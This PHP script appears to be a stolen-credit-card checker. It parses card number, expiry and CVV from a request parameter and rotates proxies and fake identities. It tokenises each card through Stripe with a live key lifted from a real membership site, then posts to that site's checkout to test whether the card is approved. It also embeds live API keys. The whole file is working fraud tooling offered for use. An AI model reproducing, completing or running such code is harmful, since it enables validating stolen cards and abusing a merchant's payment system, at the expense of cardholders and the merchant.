<?php
    
    error_reporting(0);
    
  //BY PINKY
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    if (substr($explode[0], 0, 1) == '4') {
        $bander = '<font color="#0bbaee"><i class="fa fa-cc-visa" aria-hidden="true"></i></font>';
        $info = 'VISA';
    } elseif (substr($explode[0], 0, 1) == '5') {
        $bander = '<font color="#FF4500"><i class="fa fa-cc-mastercard" aria-hidden="true"></i>';
        $info = 'ECMC';
    } elseif (substr($explode[0], 0, 1) == '3') {
        $bander = '<font color="#137694"><i class="fa fa-cc-amex" aria-hidden="true"></i>';
        $info = 'AMEX';
    } else {
        $bander = '<font color="#ff0000"><i class="fa fa-cc" aria-hidden="true"></font>';
    }
    function getStr2($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
  $lista = "$cc|$mes|$ano|$cvv";
  
    }

if($ano=="2020"){ 
  $ano="20";
}
else if($ano=="2021"){ 
  $ano="21";
}
else if($ano=="2022"){ 
  $ano="22";
}
else if($ano=="2023"){ 
  $ano="23";
}
else if($ano=="2024"){ 
  $ano="24";
}
else if($ano=="2025"){ 
  $ano="25";
}
else if($ano=="2026"){ 
  $ano="26";
}
else if($ano=="2027"){ 
  $ano="27";
}
else if($ano=="2028"){ 
  $ano="28";
}
else{
  $ano = "21";
}

$last = substr($cc, 12, 16);
  
  function getBin($cc){
    $bin = substr($cc, 0, 6);
    $searchfor = $bin;
    $contents = file_get_contents('bins.csv');
    $pattern = preg_quote($searchfor, '/');
    $pattern = "/^.*$pattern.*\$/m";
    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }
    $pieces = explode(";", $encontrada);
    $c = count($pieces);
    if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
    } else {
     $pais = $pieces[5];
     $paiscode = $pieces[6];
     $level = $pieces[4];
     $banco = $pieces[2];
     $bandeira = $pieces[1];
    }
    return ''.$bandeira.' '.$banco.' '.$level.'('.$pais.')';
  }
  
  
$bin = substr($cc, 0, 6);
$bin = getBin($bin);  
  function GetStr($string, $start, $end)
{
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}
    function dadosnome(){
        $nome = file("lista_nomes.txt");
        $mynome = rand(0, sizeof($nome)-1);
        $nome = $nome[$mynome];
        return $nome;
    }
    function dadossobre(){
        $sobrenome = file("lista_sobrenomes.txt");
        $mysobrenome = rand(0, sizeof($sobrenome)-1);
        $sobrenome = $sobrenome[$mysobrenome];
        return $sobrenome;
    }
    
      
                        
   $nome = dadosnome();
    $sobrenome = dadossobre();
   $email = $nome.$sobrenome.mt_rand(00,99);
    $stripped = preg_replace('/\s/', '', $email);
$email1 = strtolower($stripped);
    
   
   
    $keys = array(
  1 => 'pk_live_BzITKuEDSL0AOSLtNPh2MbCT00IbRBDfCX'
  ); 
    $key = array_rand($keys);
    $keyStripe = $keys[$key];
function cyraxproxies()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = cyraxproxies();
$super_proxy = 'zproxy.lum-superproxy.io';
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
      
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        
/////////// [Bin Lookup Api] /////////////


/////////////////////////////////////PROXIES////////////////////////////////////////////////////

////////////////////////////////////===[For Authorizing Cards]////////////////////////////////////////////////////
////////////////////////////////////////////////////////////1 req/////////////////////////////////========================================
$ch = curl_init('');
curl_setopt($ch, CURLPROXY_SOCKS5, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'accept: application/json',
'origin: https://js.stripe.com',
'user-agent: Mozilla/5.0 (Linux; Android 9; motorola one macro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded',
'referer: https://js.stripe.com/v3/controller-18834da9a5d67ae588e8b8bcf4d8282c.html'
));    
curl_setopt($ch, CURLOPT_POSTFIELDS, 
'type=card&billing_details[address][postal_code]='.$postcode.'&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e0d4ee99-4bf0-4d0a-8f9b-a5ac6443ad268e2957&muid=ff1e7cc4-e8f9-4ad3-acd6-303c33f9deb8908c77&sid=d43340ea-af9e-4ab8-9e03-2372ebd765f902153e&pasted_fields=number&payment_user_agent=stripe.js%2Fee8ddbd09%3B+stripe-js-v3%2Fee8ddbd09&time_on_page=25776&referrer=https%3A%2F%2Fehrmanblog.org%2Fregister%2Fsilver-monthly-membership%2F%3Faction%3Dcheckout%26txn%3Dego&key=pk_live_51FgmhVE89nTngkWkcKcnu7JfkiXUFx38LYO0z7QeqVSCc8vd9NreigOYED685E7riVQz086P4J4rED4fuvCY5TfU00r2zB6HKE');
$result1 = curl_exec($ch);
//echo "<b>1REQ Result:</b> $result1<br><br>"; 
//$a = json_decode($result1, true);
$token = $a['data']['tokenizeCreditCard']['token'];

//echo<b> Message </b> $result"; 
$token = trim(strip_tags(getstr($result1,'"id": "','"')));
$message1 = trim(strip_tags(getstr($result1,'"message": "','"')));
//echo "$token";

//////////////////////////////////////////////2 req  ///////////////////////////////////////////============================================
$nome = ["Kai Lima Castro","Andre Rodrigues Costa","Renan Cavalcanti Barbosa","Thiago Fernandes Ribeiro","Igor Correia Martins","Renan Santos Correia","Diogo Almeida Alves","Matheus Silva Melo"];
$nome_pag = $nome[array_rand($nome)];
$email2 = strtolower(str_replace(' ', '', $nome_pag)) . rand(00000,99999) . "@outlook.com";
$post = '{"card_number":"'.$cc.'","expiration_month":'.$mes.',"expiration_year":'.$ano.',"security_code":"'.$cvv.'","cardholder":{"name":"MARIO DIAS"}}';
$token = $token;
$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);
 $random                = substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz", 6)), 0, 6);
    $random_valor          = rand(1, 9);
    $random_valor_centavos = rand(10, 99);
//////////////////////////////////////////////2 req  ///////////////////////////////////////////============================================

$ch = curl_init();
curl_setopt($ch, CURLPROXY_SOCKS5, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://ehrmanblog.org/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: ehrmanblog.org',
'accept: application/json, text/javascript, */*; q=0.01',
'origin: https://ehrmanblog.org',
'user-agent: Mozilla/5.0 (Linux; Android 9; motorola one macro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
'content-type: multipart/form-data; boundary=----WebKitFormBoundary1RfpAeRAtDKpKg8P',
'referer: https://ehrmanblog.org/register/silver-monthly-membership/?action=checkout&txn=ego'
));

curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundary1RfpAeRAtDKpKg8P
Content-Disposition: form-data; name="mepr_transaction_id"

18744
------WebKitFormBoundary1RfpAeRAtDKpKg8P
Content-Disposition: form-data; name="address_required"

0
------WebKitFormBoundary1RfpAeRAtDKpKg8P
Content-Disposition: form-data; name="card-name"

'.$name.'+'.$last.'
------WebKitFormBoundary1RfpAeRAtDKpKg8P
Content-Disposition: form-data; name="payment_method_id"

'.$token.'
------WebKitFormBoundary1RfpAeRAtDKpKg8P
Content-Disposition: form-data; name="action"

mepr_stripe_confirm_payment
------WebKitFormBoundary1RfpAeRAtDKpKg8P
Content-Disposition: form-data; name="mepr_current_url"

https://ehrmanblog.org/register/silver-monthly-membership/?action=checkout&txn=ego#mepr_jump
------WebKitFormBoundary1RfpAeRAtDKpKg8P--
');

$result = curl_exec($ch);
$message = trim(strip_tags(getstr($result,'"message":"','"')));
$info = curl_getinfo($ch,CURLINFO_TOTAL_TIME);
$net = substr($info,0,4)."sec";



////$token = getStr($result2, '"message":"', '"');
////$code = getStr($result2, '"decline_code": "', '"');

     $bin = substr($cc, 0,6);
$binn = substr($cc, 0,6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.cardbinlist.com/search.html?bin='.$bin);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
$level     = trim(strip_tags(getstr($bin,'Card Sub Brand</th>','</td>')));
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$binn);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
curl_close($ch);
$data = date("d/m/Y H:i:s");
$pais = trim(strip_tags(getstr($bin,'country":{"alpha2":"','"')));
$banco     = trim(strip_tags(getstr($bin,'"bank":{"name":"','"')));
$brand     = trim(strip_tags(getstr($bin,'"scheme":"','"')));
$fone = trim(strip_tags(getstr($bin,'"phone":"','"')));
$tipo = trim(strip_tags(getstr($bin,'},"type":"','"')));
$latitude = trim(strip_tags(getstr($bin,'latitude":',',')));
$logitude = trim(strip_tags(getstr($bin,'longitude":','}}')));
$prepago = trim(strip_tags(getstr($bin,'"prepaid":',',')));
$valores = array('R$ 1,00','R$ 5,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
$debitouu = $valores[mt_rand(0,9)];
    //////////////////////===[Card Response] 
if  (strpos($result, "Obrigado") !== false) {
        $bin = substr($explode[0], 0, 6);
    $bin_item = file_get_contents('https://api.bincodes.com/bin-checker.php?api_key=3e0dcbb752e5b9fea6f087c3d654ad8f&bin=' . $bin . '&format=json');
    $bin_item = json_decode($bin_item, false);
    
    $bank        = $bin_item->bank == '' ? 'N/A' : $bin_item->bank;
    $type        = $bin_item->type == '' ? 'N/A' : $bin_item->type;
    $level       = $bin_item->level == '' ? 'N/A' : $bin_item->level;
    $countrycode = $bin_item->countrycode == '' ? 'N/A' : $bin_item->countrycode;}
if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">#Approved_CVV</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVV MATCHED XxNavasxX 🐉 </span> </span> <span class="badge badge-info"> '.$bank.'  ('.$country.') </span> </br>';
}

elseif(strpos($result, "Your card's security code is incorrect." )) {
	
  echo "<tr><td><font size='1'>$bander</font></td><td><font color='#1ABE88' size='1'>Aprovada</font></td><td><font size='1'>$cc=</font></td>/<td><font size='1'>$mes=</font></td>/<td><font size='1'>$ano=</font></td>/<td><font size='1'>$cvv</font></td><td><font></font><font color='#1ABE88' size='1'>R$: $random_valor,$random_valor_centavos</font></td><td><font size='1'> | Dragcchek | </font></td></tr>";
}

 
elseif(strpos($result, 'Your card was declined.')) {
  echo "<tr><td><font size='1'>$bander</font></td><td><font color='#DA514A' size='1'>Reprovada</font></td><td><font size='1'>$cc=</font></td>/<td><font size='1'>$mes=</font></td>/<td><font size='1'>$ano=</font></td>/<td><font size='1'>$cvv</font></td><td><font></font><font color='#DA514A' size='1'>R$: $random_valor,$random_valor_centavos</font></td><td><font size='1'> | Dragcchek | </font></td></tr>";
}

 else {
  echo "<tr><td><font size='1'>$bander</font></td><td><font color='#DA514A' size='1'>Reprovada</font></td><td><font size='1'>$cc=</font></td>/<td><font size='1'>$mes=</font></td>/<td><font size='1'>$ano=</font></td>/<td><font size='1'>$cvv</font></td><td><font></font><font color='#DA514A' size='1'>R$: $random_valor,$random_valor_centavos</font></td><td><font size='1'> | Dragcchek Error|api </font></td></tr>";
}

curl_close($ch);
ob_flush();
echo "<b>2REQ Result:</b> $result<br><br>";
//////=========


///////////////////////////////////////////////====Dragcchek==============\\\\\\\\\\\\\\\
?>